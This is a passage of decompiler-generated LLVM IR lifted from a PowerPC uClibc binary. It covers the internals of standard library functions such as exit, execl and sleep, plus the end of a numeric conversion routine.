dec_label_pc_10006898:                            ; preds = %dec_label_pc_10006870
  %v2_10006870 = mul i32 %v1_10006860, %v0_10006870
  %v2_10006898 = add i32 %v2_10006870, %v1_10006898
  store i32 %v2_10006898, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10006828

dec_label_pc_100068a0:                            ; preds = %dec_label_pc_10006860, %dec_label_pc_10006800
  %v0_100068a8 = phi i32 [ %v0_100068a814, %dec_label_pc_10006800 ], [ %v0_100068a812, %dec_label_pc_10006860 ]
  %v0_100068a0 = load i32, i32* %r25.global-to-local, align 4
  %v3_100068a0 = icmp eq i32 %v0_100068a0, 0
  br i1 %v3_100068a0, label %dec_label_pc_100068ac, label %dec_label_pc_100068a8

dec_label_pc_100068a8:                            ; preds = %dec_label_pc_100068a0
  %v2_100068a8 = inttoptr i32 %v0_100068a0 to i32*
  store i32 %v0_100068a8, i32* %v2_100068a8, align 4
  br label %dec_label_pc_100068ac

dec_label_pc_100068ac:                            ; preds = %dec_label_pc_100068a0, %dec_label_pc_100068a8
  %v0_100068ac = load i32, i32* %r28.global-to-local, align 4
  %v1_100068ac = sub i32 0, %v0_100068ac
  %v0_100068b4 = load i32, i32* %r26.global-to-local, align 4
  %v3_100068b4 = icmp eq i32 %v0_100068b4, 0
  %tmp27 = lshr i32 %v1_100068ac, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_100068f0.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_100068b4, label %dec_label_pc_100068e0, label %dec_label_pc_100068c8

dec_label_pc_100068c8:                            ; preds = %dec_label_pc_100068ac
  %v3_100068c8 = icmp ugt i32 %v0_100068f0.pre.pre, %tmp28
  br i1 %v3_100068c8, label %dec_label_pc_100068d0, label %dec_label_pc_100068e0

dec_label_pc_100068d0:                            ; preds = %dec_label_pc_100068c8
  %v0_100068d0 = call i32 @__errno_location()
  %v2_100068d8 = inttoptr i32 %v0_100068d0 to i32*
  store i32 34, i32* %v2_100068d8, align 4
  %v0_100068dc = load i32, i32* @r31, align 4
  store i32 %v0_100068dc, i32* %r10.global-to-local, align 4
  %v0_100068e0.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100068e0

dec_label_pc_100068e0:                            ; preds = %dec_label_pc_100068ac, %dec_label_pc_100068c8, %dec_label_pc_100068d0
  %v0_100068f0.pre = phi i32 [ %v0_100068f0.pre.pre, %dec_label_pc_100068c8 ], [ %v0_100068dc, %dec_label_pc_100068d0 ], [ %v0_100068f0.pre.pre, %dec_label_pc_100068ac ]
  %v0_100068e0 = phi i32 [ %v0_100068ac, %dec_label_pc_100068c8 ], [ %v0_100068e0.pre, %dec_label_pc_100068d0 ], [ %v0_100068ac, %dec_label_pc_100068ac ]
  %v3_100068e0 = icmp eq i32 %v0_100068e0, 0
  br i1 %v3_100068e0, label %dec_label_pc_100068ec, label %dec_label_pc_100068e8

dec_label_pc_100068e8:                            ; preds = %dec_label_pc_100068e0
  %v1_100068e8 = sub i32 0, %v0_100068f0.pre
  store i32 %v1_100068e8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100068ec

dec_label_pc_100068ec:                            ; preds = %dec_label_pc_100068e0, %dec_label_pc_100068e8
  %v0_100068f0 = phi i32 [ %v1_100068e8, %dec_label_pc_100068e8 ], [ %v0_100068f0.pre, %dec_label_pc_100068e0 ]
  ret i32 %v0_100068f0

; uselistorder directives
  uselistorder i32 %v0_100068f0.pre, { 1, 0 }
  uselistorder i32 %v0_100068f0.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_10006898, { 1, 0 }
  uselistorder i32 %v1_10006864, { 1, 0 }
  uselistorder i32 %v1_10006840, { 1, 0 }
  uselistorder i32 %v1_1000683c, { 1, 0 }
  uselistorder i32 %v3_1000682c, { 1, 0 }
  uselistorder i32 %v0_10006870, { 1, 0, 2 }
  uselistorder i32 %v1_10006830, { 0, 2, 1 }
  uselistorder i32 %v0_10006828, { 1, 0 }
  uselistorder i32 %v2_10006814, { 1, 0, 2 }
  uselistorder i32 %v1_100067ec, { 1, 0 }
  uselistorder i32 %v1_100067d8, { 1, 0, 2 }
  uselistorder i32 %v0_100067b4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_100068ec, { 1, 0 }
  uselistorder label %dec_label_pc_100068e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100068ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006860, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000682c, { 1, 0 }
  uselistorder label %dec_label_pc_10006800, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100067f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100067b8, { 1, 0 }
  uselistorder label %dec_label_pc_100067b4, { 1, 0 }
  uselistorder label %dec_label_pc_10006780, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10006920 = ptrtoint i32* %stack_var_-40 to i32
  %v0_10006928 = load i32, i32* @r3, align 4
  store i32 %v0_10006928, i32* @r31, align 4
  store i32 %v2_10006920, i32* @r3, align 4
  %v0_10006934 = call i32 @__pthread_return_void()
  %v0_1000693c = call i32 @__pthread_return_0()
  %v3_10006944 = load i32, i32* @global_var_1001d870.414, align 4
  %v3_10006948 = icmp eq i32 %v3_10006944, 0
  br i1 %v3_10006948, label %dec_label_pc_1000695c, label %dec_label_pc_10006950

dec_label_pc_10006950:                            ; preds = %entry
  %v0_10006950 = load i32, i32* @r31, align 4
  %v3_10006958 = call i32 @unknown_0(i32 %v0_10006950, i32 268566528)
  br label %dec_label_pc_1000695c

dec_label_pc_1000695c:                            ; preds = %entry, %dec_label_pc_10006950
  store i32 %v2_10006920, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10006964 = call i32 @__pthread_return_void()
  store i32 %v0_10006964, i32* @r3, align 4
  store i32 268462444, i32* @lr, align 4
  %v1_10006968 = call i32 @__GI___uClibc_fini(i32 %v0_10006964)
  store i32 268462464, i32* @lr, align 4
  %v2_1000697c = call i32 @_stdio_term(i32 %v1_10006968, i32 268449088)
  %v0_10006980 = load i32, i32* @r31, align 4
  %v1_10006984 = call i32 @__GI__exit(i32 %v0_10006980)
  ret i32 %v1_10006984

; uselistorder directives
  uselistorder label %dec_label_pc_1000695c, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10006988 = ptrtoint i32* %stack_var_0 to i32
  %v2_100069a4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100069a4, i32* %r0.global-to-local, align 4
  %v2_100069ac = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_100069a4, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100069d8

dec_label_pc_100069d8:                            ; preds = %dec_label_pc_10006a08, %entry
  %v0_100069dc = phi i32 [ 0, %entry ], [ %v1_100069dc, %dec_label_pc_10006a08 ]
  %stack_var_-52.0 = phi i32 [ %v2_100069ac, %entry ], [ %stack_var_-52.1, %dec_label_pc_10006a08 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_10006a08 ]
  %v4_100069d8 = zext i8 %stack_var_-56.0 to i32
  %v1_100069dc = add i32 %v0_100069dc, 1
  %v1_100069e4 = mul nuw nsw i32 %v4_100069d8, 4
  store i32 %v1_100069e4, i32* %r0.global-to-local, align 4
  %v2_100069e8 = add i32 %v1_100069e4, %v2_100069a4
  store i32 %v2_100069e8, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_100069fc, label %dec_label_pc_100069f4

dec_label_pc_100069f4:                            ; preds = %dec_label_pc_100069d8
  %v1_100069ec = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10006a08

dec_label_pc_100069fc:                            ; preds = %dec_label_pc_100069d8
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10006a00 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10006a00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10006a08

dec_label_pc_10006a08:                            ; preds = %dec_label_pc_100069f4, %dec_label_pc_100069fc
  %stack_var_-52.1 = phi i32 [ %v1_10006a00, %dec_label_pc_100069fc ], [ %stack_var_-52.0, %dec_label_pc_100069f4 ]
  %v0_10006a08 = phi i32 [ %stack_var_-52.0, %dec_label_pc_100069fc ], [ %v2_100069e8, %dec_label_pc_100069f4 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_100069fc ], [ %v1_100069ec, %dec_label_pc_100069f4 ]
  %v1_10006a08 = inttoptr i32 %v0_10006a08 to i32*
  %v2_10006a08 = load i32, i32* %v1_10006a08, align 4
  store i32 %v2_10006a08, i32* %r0.global-to-local, align 4
  %v3_10006a0c = icmp eq i32 %v2_10006a08, 0
  br i1 %v3_10006a0c, label %dec_label_pc_10006a14, label %dec_label_pc_100069d8

dec_label_pc_10006a14:                            ; preds = %dec_label_pc_10006a08
  %v1_10006a14 = mul i32 %v1_100069dc, 4
  store i32 %v4_10006988, i32* %r0.global-to-local, align 4
  %v1_10006a1c = add i32 %v1_10006a14, 34
  store i32 %v1_100069dc, i32* %ctr.global-to-local, align 4
  %v1_10006a24 = call i32 @__asm_rlwinm(i32 %v1_10006a1c, i32 0, i32 0, i32 27)
  %v1_10006a2c = load i32, i32* @r1, align 4
  %v3_10006a2c = sub i32 %v1_10006a2c, %v1_10006a24
  %v4_10006a2c = inttoptr i32 %v3_10006a2c to i32*
  store i32 %v4_10006988, i32* %v4_10006a2c, align 4
  %v1_10006a30 = add i32 %v3_10006a2c, 23
  store i32 %v1_10006a30, i32* %r0.global-to-local, align 4
  %v1_10006a34 = call i32 @__asm_rlwinm(i32 %v1_10006a30, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10006a3c = load i32, i32* %r8.global-to-local, align 4
  %v2_10006a3c = inttoptr i32 %v1_10006a34 to i32*
  store i32 %v0_10006a3c, i32* %v2_10006a3c, align 4
  store i32 %v1_10006a34, i32* %r11.global-to-local, align 4
  %v0_10006a44 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006a44 = trunc i32 %v0_10006a44 to i8
  store i32 %v2_100069a4, i32* %r0.global-to-local, align 4
  store i32 %v2_100069a4, i32* %stack_var_-48, align 4
  br label %dec_label_pc_10006a58

dec_label_pc_10006a58:                            ; preds = %dec_label_pc_10006a8c.dec_label_pc_10006a58_crit_edge, %dec_label_pc_10006a14
  %v0_10006a5c = phi i32 [ %v1_10006a34, %dec_label_pc_10006a14 ], [ %v0_10006a5c.pre, %dec_label_pc_10006a8c.dec_label_pc_10006a58_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_100069ac, %dec_label_pc_10006a14 ], [ %stack_var_-52.3, %dec_label_pc_10006a8c.dec_label_pc_10006a58_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10006a44, %dec_label_pc_10006a14 ], [ %stack_var_-56.3, %dec_label_pc_10006a8c.dec_label_pc_10006a58_crit_edge ]
  %v1_10006a5c = add i32 %v0_10006a5c, 4
  store i32 %v1_10006a5c, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_10006a80, label %dec_label_pc_10006a70

dec_label_pc_10006a70:                            ; preds = %dec_label_pc_10006a58
  %v4_10006a58 = zext i8 %stack_var_-56.2 to i32
  %v1_10006a68 = add i8 %stack_var_-56.2, 1
  %v1_10006a64 = mul nuw nsw i32 %v4_10006a58, 4
  %v3_10006a70 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10006a70, i32* %r0.global-to-local, align 4
  %v2_10006a78 = add i32 %v3_10006a70, %v1_10006a64
  br label %dec_label_pc_10006a8c

dec_label_pc_10006a80:                            ; preds = %dec_label_pc_10006a58
  %v1_10006a84 = add i32 %stack_var_-52.2, 4
  store i32 %v1_10006a84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10006a8c

dec_label_pc_10006a8c:                            ; preds = %dec_label_pc_10006a70, %dec_label_pc_10006a80
  %stack_var_-52.3 = phi i32 [ %v1_10006a84, %dec_label_pc_10006a80 ], [ %stack_var_-52.2, %dec_label_pc_10006a70 ]
  %v0_10006a8c = phi i32 [ %stack_var_-52.2, %dec_label_pc_10006a80 ], [ %v2_10006a78, %dec_label_pc_10006a70 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_10006a80 ], [ %v1_10006a68, %dec_label_pc_10006a70 ]
  %v1_10006a8c = inttoptr i32 %v0_10006a8c to i32*
  %v2_10006a8c = load i32, i32* %v1_10006a8c, align 4
  store i32 %v2_10006a8c, i32* %r0.global-to-local, align 4
  %v2_10006a90 = inttoptr i32 %v1_10006a5c to i32*
  store i32 %v2_10006a8c, i32* %v2_10006a90, align 4
  %v0_10006a94 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006a94 = add i32 %v0_10006a94, -1
  store i32 %v1_10006a94, i32* %ctr.global-to-local, align 4
  %v2_10006a94 = icmp eq i32 %v1_10006a94, 0
  br i1 %v2_10006a94, label %dec_label_pc_10006a98, label %dec_label_pc_10006a8c.dec_label_pc_10006a58_crit_edge

dec_label_pc_10006a8c.dec_label_pc_10006a58_crit_edge: ; preds = %dec_label_pc_10006a8c
  %v0_10006a5c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006a58

dec_label_pc_10006a98:                            ; preds = %dec_label_pc_10006a8c
  %v3_10006a9c = load i32, i32* @global_var_1001d878.416, align 4
  store i32 268462756, i32* @lr, align 4
  %v2_10006aa0 = call i32 @__GI_execve(i32 %v3_10006a9c, i32 268566528)
  %v0_10006aa4 = load i32, i32* @r1, align 4
  %v1_10006aa4 = inttoptr i32 %v0_10006aa4 to i32*
  %v2_10006aa4 = load i32, i32* %v1_10006aa4, align 4
  store i32 %v2_10006aa4, i32* %r11.global-to-local, align 4
  %v1_10006aa8 = add i32 %v2_10006aa4, 4
  %v2_10006aa8 = inttoptr i32 %v1_10006aa8 to i32*
  %v3_10006aa8 = load i32, i32* %v2_10006aa8, align 4
  store i32 %v3_10006aa8, i32* %r0.global-to-local, align 4
  ret i32 %v2_10006aa0

; uselistorder directives
  uselistorder i32 %v1_10006a94, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_100069e4, { 1, 0 }
  uselistorder i32 %v1_100069dc, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_100069a4, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_10006a8c, { 1, 0 }
  uselistorder label %dec_label_pc_10006a08, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10006ac4 = icmp eq i32 %arg1, 0
  br i1 %v3_10006ac4, label %dec_label_pc_10006c70, label %dec_label_pc_10006aec.lr.ph

dec_label_pc_10006aec.lr.ph:                      ; preds = %entry
  %v2_10006ae0 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10006ae0, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10006aec45 = add i32 %v2_10006ae0, 132
  %v3_10006aec46 = inttoptr i32 %v2_10006aec45 to i32*
  store i32 0, i32* %v3_10006aec46, align 4
  %v0_10006af047 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006af048 = add i32 %v0_10006af047, -1
  store i32 %v1_10006af048, i32* %r11.global-to-local, align 4
  %v1_10006af449 = mul i32 %v1_10006af048, 4
  %v1_10006af850 = load i32, i32* %r7.global-to-local, align 4
  %v2_10006af851 = add i32 %v1_10006af850, %v1_10006af449
  %v0_10006afc52 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006afc53 = add i32 %v0_10006afc52, -1
  store i32 %v1_10006afc53, i32* %ctr.global-to-local, align 4
  %v2_10006afc54 = icmp eq i32 %v1_10006afc53, 0
  br i1 %v2_10006afc54, label %dec_label_pc_10006b00, label %dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge

dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge: ; preds = %dec_label_pc_10006aec.lr.ph, %dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge
  %v2_10006af855 = phi i32 [ %v2_10006af8, %dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge ], [ %v2_10006af851, %dec_label_pc_10006aec.lr.ph ]
  %v0_10006aec.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10006aec = add i32 %v2_10006af855, 8
  %v3_10006aec = inttoptr i32 %v2_10006aec to i32*
  store i32 %v0_10006aec.pre, i32* %v3_10006aec, align 4
  %v0_10006af0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006af0 = add i32 %v0_10006af0, -1
  store i32 %v1_10006af0, i32* %r11.global-to-local, align 4
  %v1_10006af4 = mul i32 %v1_10006af0, 4
  %v1_10006af8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10006af8 = add i32 %v1_10006af8, %v1_10006af4
  %v0_10006afc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006afc = add i32 %v0_10006afc, -1
  store i32 %v1_10006afc, i32* %ctr.global-to-local, align 4
  %v2_10006afc = icmp eq i32 %v1_10006afc, 0
  br i1 %v2_10006afc, label %dec_label_pc_10006b00, label %dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge

dec_label_pc_10006b00:                            ; preds = %dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge, %dec_label_pc_10006aec.lr.ph
  %v2_10006af8.lcssa = phi i32 [ %v2_10006af851, %dec_label_pc_10006aec.lr.ph ], [ %v2_10006af8, %dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge ]
  %v0_10006b14.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10006b00 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10006b00, i32* %r3.global-to-local, align 4
  store i32 %v0_10006b14.pre, i32* %stack_var_-440, align 4
  %v3_10006b18 = call i32 @__sigaddset(i32 %v2_10006b00, i32 17, i32 %v2_10006af8.lcssa)
  store i32 %v3_10006b18, i32* %r3.global-to-local, align 4
  %v1_10006b1c = icmp slt i32 %v3_10006b18, 0
  br i1 %v1_10006b1c, label %dec_label_pc_10006c78, label %dec_label_pc_10006b24

dec_label_pc_10006b24:                            ; preds = %dec_label_pc_10006b00
  %v2_10006b24 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_10006b24, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268462904, i32* @lr, align 4
  %v3_10006b34 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10006b00, i32 %v2_10006b24)
  store i32 %v3_10006b34, i32* %r3.global-to-local, align 4
  %v3_10006b38 = icmp eq i32 %v3_10006b34, 0
  br i1 %v3_10006b38, label %dec_label_pc_10006b40, label %dec_label_pc_10006c78

dec_label_pc_10006b40:                            ; preds = %dec_label_pc_10006b24
  store i32 %v2_10006b24, i32* %r3.global-to-local, align 4
  %v2_10006b48 = call i32 @__sigismember(i32 %v2_10006b24, i32 17)
  store i32 %v2_10006b48, i32* %r3.global-to-local, align 4
  %v3_10006b4c = icmp eq i32 %v2_10006b48, 0
  br i1 %v3_10006b4c, label %dec_label_pc_10006b6c.lr.ph, label %dec_label_pc_10006c38

dec_label_pc_10006b6c.lr.ph:                      ; preds = %dec_label_pc_10006b40
  store i32 %v2_10006ae0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_10006aec46, align 4
  %v0_10006b7036 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006b7037 = add i32 %v0_10006b7036, -1
  store i32 %v1_10006b7037, i32* %r11.global-to-local, align 4
  %v1_10006b7438 = mul i32 %v1_10006b7037, 4
  %v1_10006b7839 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006b7840 = add i32 %v1_10006b7839, %v1_10006b7438
  %v0_10006b7c41 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006b7c42 = add i32 %v0_10006b7c41, -1
  store i32 %v1_10006b7c42, i32* %ctr.global-to-local, align 4
  %v2_10006b7c43 = icmp eq i32 %v1_10006b7c42, 0
  br i1 %v2_10006b7c43, label %dec_label_pc_10006b80, label %dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge

dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge: ; preds = %dec_label_pc_10006b6c.lr.ph, %dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge
  %v2_10006b7844 = phi i32 [ %v2_10006b78, %dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge ], [ %v2_10006b7840, %dec_label_pc_10006b6c.lr.ph ]
  %v0_10006b6c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10006b6c = add i32 %v2_10006b7844, 8
  %v3_10006b6c = inttoptr i32 %v2_10006b6c to i32*
  store i32 %v0_10006b6c.pre, i32* %v3_10006b6c, align 4
  %v0_10006b70 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006b70 = add i32 %v0_10006b70, -1
  store i32 %v1_10006b70, i32* %r11.global-to-local, align 4
  %v1_10006b74 = mul i32 %v1_10006b70, 4
  %v1_10006b78 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006b78 = add i32 %v1_10006b78, %v1_10006b74
  %v0_10006b7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006b7c = add i32 %v0_10006b7c, -1
  store i32 %v1_10006b7c, i32* %ctr.global-to-local, align 4
  %v2_10006b7c = icmp eq i32 %v1_10006b7c, 0
  br i1 %v2_10006b7c, label %dec_label_pc_10006b80, label %dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge

dec_label_pc_10006b80:                            ; preds = %dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge, %dec_label_pc_10006b6c.lr.ph
  %v2_10006b78.lcssa = phi i32 [ %v2_10006b7840, %dec_label_pc_10006b6c.lr.ph ], [ %v2_10006b78, %dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge ]
  store i32 %v2_10006b00, i32* %r3.global-to-local, align 4
  %v3_10006b88 = call i32 @__sigaddset(i32 %v2_10006b00, i32 17, i32 %v2_10006b78.lcssa)
  store i32 %v3_10006b88, i32* %r3.global-to-local, align 4
  %v1_10006b8c = icmp slt i32 %v3_10006b88, 0
  br i1 %v1_10006b8c, label %dec_label_pc_10006c78, label %dec_label_pc_10006b94

dec_label_pc_10006b94:                            ; preds = %dec_label_pc_10006b80
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10006b9c = ptrtoint i32* %stack_var_-176 to i32
  store i32 268463012, i32* @lr, align 4
  %v4_10006ba0 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_10006b9c)
  store i32 %v4_10006ba0, i32* %r3.global-to-local, align 4
  %tmp33 = icmp sgt i32 %v4_10006ba0, -1
  br i1 %tmp33, label %dec_label_pc_10006bd4, label %dec_label_pc_10006bac

dec_label_pc_10006bac:                            ; preds = %dec_label_pc_10006b94
  %v0_10006bac = call i32 @__errno_location()
  store i32 %v0_10006bac, i32* %r3.global-to-local, align 4
  %v1_10006bb4 = inttoptr i32 %v0_10006bac to i32*
  %v2_10006bb4 = load i32, i32* %v1_10006bb4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268463048, i32* @lr, align 4
  %v3_10006bc4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10006b24, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10006bcc = inttoptr i32 %v0_10006bac to i32*
  store i32 %v2_10006bb4, i32* %v2_10006bcc, align 4
  %v0_10006c8c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c7c

dec_label_pc_10006bd4:                            ; preds = %dec_label_pc_10006b94
  %v3_10006bd4 = load i32, i32* %stack_var_-176, align 4
  %v3_10006be0 = icmp eq i32 %v3_10006bd4, 1
  br i1 %v3_10006be0, label %dec_label_pc_10006be8, label %dec_label_pc_10006c1c

dec_label_pc_10006be8:                            ; preds = %dec_label_pc_10006bd4
  store i32 %v2_10006ae0, i32* %r3.global-to-local, align 4
  store i32 268463092, i32* @lr, align 4
  %v2_10006bf0 = call i32 @__libc_nanosleep(i32 %v2_10006ae0, i32 %v2_10006ae0)
  store i32 %v2_10006bf0, i32* %r3.global-to-local, align 4
  store i32 %v2_10006bf0, i32* @r31, align 4
  %v0_10006bf8 = call i32 @__errno_location()
  store i32 %v0_10006bf8, i32* %r3.global-to-local, align 4
  %v1_10006bfc = inttoptr i32 %v0_10006bf8 to i32*
  %v2_10006bfc = load i32, i32* %v1_10006bfc, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268463124, i32* @lr, align 4
  %v3_10006c10 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10006b24, i32 0)
  store i32 %v3_10006c10, i32* %r3.global-to-local, align 4
  %v2_10006c14 = inttoptr i32 %v0_10006bf8 to i32*
  store i32 %v2_10006bfc, i32* %v2_10006c14, align 4
  %v0_10006c44.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006c44

dec_label_pc_10006c1c:                            ; preds = %dec_label_pc_10006bd4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268463148, i32* @lr, align 4
  %v3_10006c28 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10006b24, i32 0)
  br label %dec_label_pc_10006c38

dec_label_pc_10006c38:                            ; preds = %dec_label_pc_10006b40, %dec_label_pc_10006c1c
  store i32 %v2_10006ae0, i32* %r3.global-to-local, align 4
  store i32 268463168, i32* @lr, align 4
  %v2_10006c3c = call i32 @__libc_nanosleep(i32 %v2_10006ae0, i32 %v2_10006ae0)
  store i32 %v2_10006c3c, i32* %r3.global-to-local, align 4
  store i32 %v2_10006c3c, i32* @r31, align 4
  br label %dec_label_pc_10006c44

dec_label_pc_10006c44:                            ; preds = %dec_label_pc_10006be8, %dec_label_pc_10006c38
  %v0_10006c44 = phi i32 [ %v0_10006c44.pr, %dec_label_pc_10006be8 ], [ %v2_10006c3c, %dec_label_pc_10006c38 ]
  %v3_10006c44 = icmp eq i32 %v0_10006c44, 0
  br i1 %v3_10006c44, label %dec_label_pc_10006c70, label %dec_label_pc_10006c4c

dec_label_pc_10006c4c:                            ; preds = %dec_label_pc_10006c44
  %v3_10006c5c = load i32, i32* %stack_var_-440, align 4
  %v0_10006c60 = call i32 @__asm_mfcr()
  store i32 %v0_10006c60, i32* %r3.global-to-local, align 4
  %v1_10006c64 = call i32 @__asm_rlwinm(i32 %v0_10006c60, i32 30, i32 31, i32 31)
  %v2_10006c68 = add i32 %v3_10006c5c, %v1_10006c64
  store i32 %v2_10006c68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c7c

dec_label_pc_10006c70:                            ; preds = %dec_label_pc_10006c44, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c7c

dec_label_pc_10006c78:                            ; preds = %dec_label_pc_10006b24, %dec_label_pc_10006b80, %dec_label_pc_10006b00
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c7c

dec_label_pc_10006c7c:                            ; preds = %dec_label_pc_10006c70, %dec_label_pc_10006c4c, %dec_label_pc_10006bac, %dec_label_pc_10006c78
  %v0_10006c8c = phi i32 [ 0, %dec_label_pc_10006c70 ], [ %v2_10006c68, %dec_label_pc_10006c4c ], [ %v0_10006c8c.pre, %dec_label_pc_10006bac ], [ -1, %dec_label_pc_10006c78 ]
  ret i32 %v0_10006c8c

; uselistorder directives
  uselistorder i32 %v1_10006b7c, { 1, 0 }
